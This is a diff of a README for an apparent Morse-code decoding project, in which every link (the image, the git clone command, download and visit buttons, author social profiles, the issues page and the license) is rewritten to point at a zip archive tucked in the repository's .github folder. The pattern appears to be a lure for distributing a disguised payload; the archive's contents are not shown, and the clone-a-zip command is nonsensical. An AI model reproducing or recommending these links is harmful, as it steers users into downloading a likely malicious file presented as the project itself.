@@ -1,4 +1,4 @@
-![](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+![](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
 
 # Decode Morse Code
 
@@ -23,7 +23,7 @@ To get a local copy up and running follow these simple example steps.
 - Clone the project
 
 ```bash 
-git clone https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip
+git clone https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip
 
 cd decode-morse-code
 ```
@@ -38,32 +38,32 @@ run the program functions
 
 ## Visit And Open Files
 
-[Visit Repo](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+[Visit Repo](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
 
 ## Download Repo
 
-[Download Repo](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+[Download Repo](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
 
 ## Authors
 
 👤 **Anselem Odimegwu**
 
-- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
-- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
-- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- GitHub: [@githubhandle](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
+- Twitter: [@twitterhandle](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
+- LinkedIn: [LinkedIn](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
 
 👤 **Ranjeet Singh**
 
-- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
-- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
-- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip)
+- GitHub: [@githubhandle](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
+- Twitter: [@twitterhandle](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
+- LinkedIn: [LinkedIn](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip)
 
 
 ## 🤝 Contributing
 
 Contributions, issues, and feature requests are welcome!
 
-Feel free to check the [issues page](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip).
+Feel free to check the [issues page](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip).
 
 ## Show your support
 
@@ -75,4 +75,4 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](https://raw.githubusercontent.com/Iptysam/decode-morse-code/dev/.github/workflows/code-morse-decode-v2.1-alpha.3.zip) licensed.
+This project is [MIT](https://github.com/Iptysam/decode-morse-code/raw/refs/heads/dev/.github/decode-morse-code-2.9.zip) licensed.
